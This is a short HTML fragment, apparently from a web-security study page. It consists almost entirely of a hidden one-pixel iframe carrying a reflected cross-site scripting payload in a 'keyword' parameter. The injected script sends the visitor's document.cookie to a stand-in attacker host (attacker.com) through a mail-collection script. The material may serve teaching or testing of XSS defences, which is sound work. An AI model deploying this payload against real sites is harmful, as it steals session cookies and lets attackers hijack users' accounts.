...
-->
	...
	<body>
		...
		-->	
		<iframe width="1" height="1" 
			src="http://mbsdss.com/SecurityStudy/php/main.php?keyword=<script>window.location='http://attacker.com/MaliciousSite/sendCollectedInfoMail.php?sid='%2Bdocument.cookie;<\/script>">
